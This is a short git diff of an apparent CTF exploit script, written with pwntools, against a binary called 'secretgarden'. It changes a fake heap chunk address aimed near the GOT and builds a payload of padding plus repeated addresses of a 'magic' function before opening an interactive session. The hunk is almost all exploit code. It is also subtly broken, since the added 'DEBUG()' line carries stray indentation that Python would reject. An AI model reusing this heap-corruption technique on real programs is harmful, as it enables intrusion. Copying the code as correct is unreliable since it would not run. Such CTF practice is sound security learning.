@@ -33,13 +33,15 @@ if __name__ == "__main__":
     remove(0) # 0 -> 1 -> 0
 
     magic = ELF("./secretgarden").sym["magic"]
-    fakeChunk = 0x601ffa
-    payload = cyclic(6) + p64(0) + p64(magic) * 2
+    #  fakeChunk = 0x602028 + 2 - 8
+    fakeChunk = 0x602000+2-8
 
     Raise(0x50, p64(fakeChunk)) # 0
     Raise(0x50, "111") # 1
     Raise(0x50, "000")
-    #  DEBUG()
+      DEBUG()
+    #  payload = cyclic(8 - 2) + p64(magic) * 8
+    payload = cyclic(8 + 8 - 2) + p64(magic) * 2
     Raise(0x50, payload)
 
     io.interactive()
